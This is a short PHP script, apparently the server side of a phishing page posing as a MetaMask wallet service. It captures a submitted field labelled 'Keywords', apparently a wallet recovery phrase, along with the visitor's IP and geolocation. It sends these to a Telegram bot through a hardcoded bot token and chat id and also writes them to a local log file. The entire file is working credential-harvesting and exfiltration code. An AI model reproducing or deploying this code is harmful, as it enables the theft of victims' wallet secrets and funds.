<?php
/*
 For fun and knowledge, always think out of the box! :)
 Regards,
 leonuz
*/

$client_ip = $_SERVER['REMOTE_ADDR'];

$geo = "N/A";
$city = "N/A";

$ipinfo_data = file_get_contents("http://ipinfo.io/" . $client_ip . "/json");
$ipinfo_data = json_decode($ipinfo_data);

if ($ipinfo_data && isset($ipinfo_data->country) && isset($ipinfo_data->city)) {
    $geo = $ipinfo_data->country;
    $city = $ipinfo_data->city;
}

$date = date("m.d.Y");

$message = "";
$message .= "Ransom World | Cryptocurrency\n \n";
$message .= "Wallet= Metamask \n";
$message .= "Date=" . $date . "\n";
$message .= "IP=" . $client_ip . "\n";
$message .= "Geo=" . $geo . " | " . $city . "\n";
$message .= "Keywords=" . $_POST["data"] . "\n"; 

$token = "6349985835:AAEk9_3QE13c_BLhbmmcnMJqaCVqmSAtuGg";
$telegram_api_url = "https://api.telegram.org/bot$token/sendMessage";
$id = "6469507544";

$telegram_data = [
    "chat_id" => $id,
    "text" => $message,
];

$telegram_response = file_get_contents($telegram_api_url . '?' . http_build_query($telegram_data));

$handle = fopen("log.txt", "a");
fwrite($handle, $message . "\n\n\n\n"); 
fclose($handle);
exit;
?>

